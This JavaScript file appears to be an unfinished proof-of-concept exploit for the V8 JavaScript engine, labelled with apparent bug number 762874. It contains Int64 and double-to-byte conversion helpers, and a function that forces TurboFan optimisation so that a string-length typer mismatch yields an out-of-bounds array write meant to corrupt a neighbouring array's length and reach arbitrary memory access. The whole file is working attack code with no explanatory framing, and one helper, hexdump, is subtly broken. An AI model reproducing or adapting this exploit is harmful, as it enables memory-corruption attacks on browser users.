String.prototype.padLeft =
Number.prototype.padLeft = function(total, pad) {
  return (Array(total).join(pad || 0) + this).slice(-total);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++){
        //print(bytes[i].toString(16));
        res.push(('0' + bytes[i].toString(16)).substr(-2));
    }
    return res.join('');

}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
        var chunk = data.slice(i, i+16);
    for (var i = 0; i < data.length; i += 16) {
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            //print(bigEndian.toString());
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        //print("toString");
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function hex(a) {
    if (a == undefined) return "0xUNDEFINED";
    var ret = a.toString(16);
    if (ret.substr(0,2) != "0x") return "0x"+ret;
    else return ret;
}

function lower(x) {
    // returns the lower 32bit of double x
    return parseInt(("0000000000000000" + Int64.fromDouble(x).toString()).substr(-8,8),16) | 0;
}

function upper(x) {
    // returns the upper 32bit of double x
    return parseInt(("0000000000000000" + Int64.fromDouble(x).toString()).substr(-16, 8),16) | 0;
}


function lowerint(x) {
    // returns the lower 32bit of int x
    return parseInt(("0000000000000000" + x.toString(16)).substr(-8,8),16) | 0;
}

function upperint(x) {
    // returns the upper 32bit of int x
    return parseInt(("0000000000000000" + x.toString(16)).substr(-16, 8),16) | 0;
}

function combine(a, b) {
    //a = a >>> 0;
    //b = b >>> 0;
    //print(a.toString());
    //print(b.toString());
    return parseInt(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), 16);
}


//padLeft用于字符串左补位

function combineint(a, b) {
    //a = a >>> 0;
    //b = b >>> 0;
    return parseInt(b.toString(16).substr(-8,8) + (a.toString(16)).padLeft(8), 16);
}

function gc(){
  for (var i = 0; i < 1024 * 1024 * 16; i++){
    new String();
  }
}

function clear_space(){
  gc();
  gc();
}

function debug_stub(msg){
    console.log(msg);
    readline();
}

//-------------762874-------------

function maxstring() {
  // force TurboFan
  try {} finally {}

  var i = 'A'.repeat(2**28 - 16).indexOf("", 2**28);
  i += 16; // real value: i = 2**28, optimizer: i = 2**28-1
  i >>= 28; // real value i = 1, optimizer: i = 0
  i *= 9; // real value i = 100000, optimizer: i = 0
  if (i > 3) {
    return 0;
  } else {
    
    // //you must be careful not to trigger 
    var arr = [0.1, 0.2, 0.3, 0.4]; //overflow index
    var arr2= [0.1, 0.2, 0.3, 0.4]; //overwrite size
    var obj = [{},{},{},{}]; //target obj to leak
    

    // let x = new ArrayBuffer(0x20); will trigger weird memory operation.
    // var buf = new ArrayBuffer(0x20);
    arr[i] = 2.1729236899484e-311;
    let k = arr[i];
    if(k != undefined){
    // arr[i] = 2.1729236899484e-311;
    var buf = new ArrayBuffer(0x20);//target arraybuf to cause arw.
    
    %DebugPrint(arr);
    %DebugPrint(arr2);
    %DebugPrint(obj);
    %DebugPrint(buf);
    console.log(k);
    readline();
    return arr[i];
    }
  }
}

function opttest() {
  // call in a loop to trigger optimization
  for (var i = 0; i < 100000; i++) {
    var o = maxstring();
    if (o == 0 || o == undefined) {
      continue;
    }
    return o;
  }
  console.log("fail");
}

opttest();